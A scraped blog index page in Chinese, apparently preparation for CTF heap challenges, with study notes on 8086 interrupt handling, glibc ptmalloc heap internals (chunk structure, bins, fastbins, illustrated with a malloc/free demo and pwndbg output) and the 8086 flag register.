<h4 id="在执行完向ss寄存器传送数据的指令后"><a href="#在执行完向ss寄存器传送数据的指令后" class="headerlink" title="在执行完向ss寄存器传送数据的指令后"></a>在执行完向ss寄存器传送数据的指令后</h4><p>这样做的主要原因是ss:sp联合指向栈，而对它们的设置应该连续完成，因为如果在执行完设置ss的指令后，没设置sp寄存器，CPU响应中断的话，压栈标志寄存器、CS和IP的值，ss:sp指向的不是正确的栈顶，将引起错误</p>
<p>我们应该利用这个特性，将设置ss和sp的指令连续存放，之间CPU不会引发中断过程</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/07/╝≥├≈╢╤╚δ├┼/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/07/╝≥├≈╢╤╚δ├┼/" class="post-title-link" itemprop="url">简明堆入门</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-07 23:56:29" itemprop="dateCreated datePublished" datetime="2020-02-07T23:56:29-08:00">2020-02-07</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Bearbeitet am</span>
                <time title="Geändert am: 2020-02-08 15:57:08" itemprop="dateModified" datetime="2020-02-08T15:57:08-08:00">2020-02-08</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>系统会调用一些函数在内存中开辟一大片空间作为堆的分配使用空间</li>
<li>malloc函数再从这一片堆的分配使用空间中分配0x10大小的空间，将指向该空间的地址返回给ptr(系统分配未使用余下的空间称为<strong>topchunk</strong>)</li>
</ul>
<h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p>我们称运行过程中被malloc分配的内存为一个chunk，这块内存在ptmalloc中用malloc_chunk结构体表示，当程序申请的chunk被free时，会被加入相应的空闲管理列表中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	fd = Forward pointer to next chunk</span></span><br><span class="line"><span class="comment">	bk = Back pointer to previous chunk</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>prev_size：如果前一个chunk是空闲的，该域表示前一个chunk的大小，如果前一个chunk不空闲，该域无意义，被前一个chunk占用复用</li>
<li>size：当前chunk的大小，并且记录了当前chunk和前一个chunk的一些属性，二进制后三位是标志位</li>
<li>FD：记录了下一个被free的chunk（used only if free）</li>
<li>BK：记录了上一个被free的chunk（used only if free）</li>
<li>fd_nextsize和bk_nextsize，只在largebin使用，记录了上/下一个被free chunk的size</li>
</ul>
<p>chunk是有他的神奇之处的，chunk虽然由一个统一的结构体声明，但是在被使用时和空闲时却又有两种不同的状态</p>
<p>使用中的chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>空闲中的chunk（被free后）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk                            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `head:' |             Size of chunk, in bytes                         |P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Forward pointer to next chunk in <span class="built_in">list</span>             |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Back pointer to previous chunk in <span class="built_in">list</span>            |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Unused space (may be 0 bytes long)                .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">    `foot:' |             Size of chunk, in bytes                           |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<h2 id="chunk的复用技术"><a href="#chunk的复用技术" class="headerlink" title="chunk的复用技术"></a>chunk的复用技术</h2><p>chunk中的字段prev_size是可以复用的：</p>
<ul>
<li>如果前一个邻接的chunk块空闲，那么当前chunk块结构体内的prev_size字段记录的是前一个邻接chunk块的大小。这就是由当前chunk指针获得前一个空闲chunk地址的依据。宏<code>prev_chunk(p)</code>就是依赖这个假设实现的<ul>
<li>获得前一个chunk的地址：当前chunk的地址 - prev_size</li>
</ul>
</li>
<li>如果前一个邻接chunk在使用中，则当前chunk的prev_size的空间被前一个chunk借用中，其中的值是前一个chunk的内存内容，对当前chunk没有任何意义</li>
</ul>
<h2 id="使用中的chunk"><a href="#使用中的chunk" class="headerlink" title="使用中的chunk"></a>使用中的chunk</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of previous chunk, <span class="keyword">if</span> allocated            | |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk, in bytes                       |M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of chunk                                     |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>

<p>在size字段中最后三位有AMP三个标志位，但是在结构体中却没有定义，我们当前只需要记住P标志位</p>
<ul>
<li>PREV_INUSE：记录前一个chunk块是否被分配</li>
</ul>
<p>ptmalloc使用chunk实现内存管理，对chunk的管理基于独特的边界标记法。最重要的是地址的对齐。在不同的平台下，每个chunk的最小大小，地址对齐方式是不同的（地址对齐：即需要满足某个字节大小的整数倍，提高效率），ptmalloc依赖平台定义的<strong>size_t</strong>长度，对于32位平台，<strong>size_t</strong>长度为<strong>4</strong>字节，对于64位平台，size_t长度可能为<strong>4</strong>字节，也可能为<strong>8</strong>字节，在Linux X86_64上为<strong>8</strong>字节（做题常用环境）</p>
<p>在64位平台下，一个使用中的chunk的大小的计算公式应该是：</p>
<ul>
<li>in_use_size =（用户请求大小+16byte-8byte）align to 8byte</li>
</ul>
<p>这里的16字节是因为需要存储<strong>prev_size</strong>和<strong>size</strong>域，但又因为向下一个chunk“借”了8字节（也就是<strong>prev_size</strong>域的复用），所以实际空间大小要减去8字节，每分配一个chunk的<strong>overhead</strong>为8字节，即SIZE_SZ的大小</p>
<p>ptmalloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为<strong>0x20</strong>（0x10+0x10 or 4*8），即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和，这样换用二进制就是100000，size字段的低三位就永远不会被使用，低三位就被用来当作flag位</p>
<h2 id="堆的释放"><a href="#堆的释放" class="headerlink" title="堆的释放"></a>堆的释放</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(ptr);</span><br></pre></td></tr></table></figure>

<p>堆的释放一般都是用free函数实现。堆释放后，会被添加到相应的bins中进行管理，这里涉及到的结构体就是<strong>malloc_state</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> THREAD_STATS</span></span><br><span class="line">  <span class="comment">/* Statistics for locking.  Only used if THREAD_STATS is defined.  */</span></span><br><span class="line">  <span class="keyword">long</span> stat_lock_direct, stat_lock_loop, stat_lock_wait;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span>     binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>对于空闲的chunk，ptmalloc采用分箱式内存管理方式，根据空闲的chunk的大小和处于的状态将其放在四个不同的bin中，这四个空闲的chunk的容器包括：fast bins，unsort bin、small bins和large bins</p>
<h2 id="Bins"><a href="#Bins" class="headerlink" title="Bins"></a>Bins</h2><p>首先，glibc malloc分配了若干个bins，为了方便查找了，glibc提供了两个数组：fastbinY和binsBins，英文解释是垃圾桶，在这里就存放被free的chunk</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/CTF%E2%80%94%E2%80%94WriteUP/how2heap/15548795-49ecc4bc156e439a.png" alt="img"></p>
<p>fastbinsY是拥有10（NFASTBINS）个元素的数组，用于存放每个fast chunk链表头指针，所以fast bins最多包含10个fast chunk的<strong>单向</strong>链表</p>
<p>bins用于存储unstored bin，small bins和large bins的chunk链表头，small bins一共62个，large bins一共63个，加起来一共125个bin，是<strong>双向</strong>链表管理</p>
<h2 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h2><p>首先编写下面程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1,*ptr2,*ptr3,*ptr4;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line">    <span class="built_in">free</span>(ptr4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GDB调试可得：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x555555756250</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x555555756270</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x555555756260</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x555555756290</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x555555756280</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x5555557562b0</span> FASTBIN &#123;</span><br><span class="line">  mchunk_prev_size = <span class="number">0</span>, </span><br><span class="line">  mchunk_size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x5555557562a0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x20d31</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x20</span> [  <span class="number">4</span>]: <span class="number">0x5555557562c0</span> —▸ <span class="number">0x5555557562a0</span> —▸ <span class="number">0x555555756280</span> —▸ <span class="number">0x555555756260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>还可以直接查看内存中chunk的情况（64位系统用gx，32位用wx）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>gx <span class="number">0x555555756250</span></span><br><span class="line">    				(prev_size)          (size)</span><br><span class="line"><span class="number">0x555555756250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line">                             (User data)</span><br><span class="line"><span class="number">0x555555756260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>fastbins主要是用于提高小内存的分配效率，默认情况下：</p>
<ul>
<li>对于SIZE_SZ为4Bytes的平台，小于64Bytes的chunk分配请求</li>
<li>对于SIZE_SZ为8Bytes的平台，小于128Bytes的chunk分配请求</li>
</ul>
<p>首先会查找fastbins中是否有所需要大小的chunk存在（精确匹配大小），如果存在，就直接返回</p>
<p>fastbins可以看作是samll bins的一小部分cache，默认情况下，fastbins只cache了small bins的前7个大小的空闲chunk（虽然有10个chunk的空间），也就是说：</p>
<ul>
<li>对于对于SIZE_SZ为4Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：16Bytes，24Bytes，32Bytes，40Bytes，56Bytes，64Bytes</li>
<li>对于对于SIZE_SZ为8Bytes的平台，fastbins的7个chunk空闲链表（bin），每个bin的chunk大小依次为：32Bytes，48Bytes，64Bytes，80Bytes，96Bytes，128Bytes</li>
</ul>
<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><p>可以看作是small bins和large bins的cache，只有<strong>1</strong>个unsort bin，以双向链表管理空闲chunk，空闲chunk不排序，所有的chunk在回收时都要先放到unsorted bin中，分配时，如果在unsorted bin中没有合适的chunk，就会把unsorted bin中的所有的chunk分别加入到所属的bin中，然后再在bin中分配合适的chunk。Bins数组中的元素bin[1]用于存储unsorted bin的chunk链表头</p>
<h2 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h2><p>small bins管理空闲小chunk，每个small bin中的chunk大小与bin的index有如下关系：</p>
<ul>
<li>chunk_size = 2*SIZE_SZ * index</li>
</ul>
<p>因此在SIZE_SZ为4B的平台上，small_bins中的chunk大小是以8B为公差的等差数列，最大的chunk大小为504B，最小的chunk大小为16B，所在实际上共62个bin</p>
<p>在SIZE_SZ为8B的平台上，small_bins中的chunk大小是以16B为公差的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所在实际上共62个bin</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/07/8086╗π▒α▒╩╝╟04/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2020/02/07/8086╗π▒α▒╩╝╟04/" class="post-title-link" itemprop="url">8086汇编笔记04</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Veröffentlicht am</span>

              
                
              

              <time title="Erstellt: 2020-02-07 00:33:23 / Geändert am: 16:33:38" itemprop="dateCreated datePublished" datetime="2020-02-07T00:33:23-08:00">2020-02-07</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>8086CPU的标志寄存器(flag)有16位，其中存储的信息通常被称为程序状态字(PSW)。flag和其它寄存器不一样，其它寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息</p>
<p>flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义。而0、2、4、6、7、8、9、10、11位都具有特殊的含义</p>
<table>
<thead>
<tr>
<th align="center">0</th>
<th align="center">CF</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>2</strong></td>
<td align="center"><strong>PF</strong></td>
</tr>
<tr>
<td align="center"><strong>4</strong></td>
<td align="center"><strong>AF</strong></td>
</tr>
<tr>
<td align="center"><strong>6</strong></td>
<td align="center"><strong>ZF</strong></td>
</tr>
<tr>
<td align="center"><strong>7</strong></td>
<td align="center"><strong>SF</strong></td>
</tr>
<tr>
<td align="center"><strong>8</strong></td>
<td align="center"><strong>TF</strong></td>
</tr>
<tr>
<td align="center"><strong>9</strong></td>
<td align="center"><strong>IF</strong></td>
</tr>
<tr>
<td align="center"><strong>10</strong></td>
<td align="center"><strong>DF</strong></td>
</tr>
<tr>
<td align="center"><strong>11</strong></td>
<td align="center"><strong>OF</strong></td>
</tr>
</tbody></table>
<p>在8086CPU的指令集中，有的指令的执行是影响标志寄存器的，比如：add、sub、mul、div、inc、or、and等，它们大都是运算指令（进行逻辑或算术运算）</p>
<p>有的指令的执行对标志寄存器没有影响，比如：mov、push、pop等，它们大都是传送指令</p>
<p>我们在使用一条指令的时候，要注意这条指令的全部功能，其中包括，执行结果对标志寄存器的哪些标志位造成影响。有时候一条指令会对标志寄存器中的多个标志位产生影响</p>
<h2 id="ZF标志"><a href="#ZF标志" class="headerlink" title="ZF标志"></a>ZF标志</h2><p>ZF是零标志位，它记录相关指令执行后：</p>
<ul>
<li>结果为0，ZF=1</li>
<li>结果不为0，ZF=0</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>

<p>指令执行后，结果为0，则ZF=1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ax,2</span><br><span class="line">sub ax,1</span><br></pre></td></tr></table></figure>

<p>指令执行后，结果为1，则ZF=0</p>
<h2 id="PF标志"><a href="#PF标志" class="headerlink" title="PF标志"></a>PF标志</h2><p>PF是奇偶标志位，它记录指令执行后，结果的所有二进制位中1的个数：</p>
<ul>
<li>为偶数，PF=1</li>
<li>为奇数，PF=0</li>
</ul>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">add al,10</span><br></pre></td></tr></table></figure>

<p>执行后，结果为00001011B，其中有3（奇数）个1，则PF=0</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,1</span><br><span class="line">or 	al,10</span><br></pre></td></tr></table></figure>

<p>执行后，结果为00000011B，其中有2（偶数）个1，则PF=1</p>
<h2 id="SF标志"><a href="#SF标志" class="headerlink" title="SF标志"></a>SF标志</h2><p>SF是符号标志位，它记录指令执行后：</p>
<ul>
<li>结果为负，SF=1</li>
<li>结果为正，SF=0</li>
</ul>
<p>在我们将数据当作有符号数来运算的时候，可以通过它来得知结果的正负。但是，如果我们将数据当作无符号数来运算，SF的值则没有意义，虽然相关的指令影响了它的值</p>
<p>CPU在执行add等指令时，是必然要影响到SF标志位的值，至于我们需不要这种影响，就取决于我们如何看待指令所进行的运算了</p>
<h2 id="CF标志"><a href="#CF标志" class="headerlink" title="CF标志"></a>CF标志</h2><p>CF是进位标志位，一般情况下，在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值，或从更高位的借位值</p>
<p>对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位是最高有效位。而假想存在的第N位，就是相对于最高有效位的更高位。其实CPU在运算的时候，并不丢弃进位值，而是记录在CF位</p>
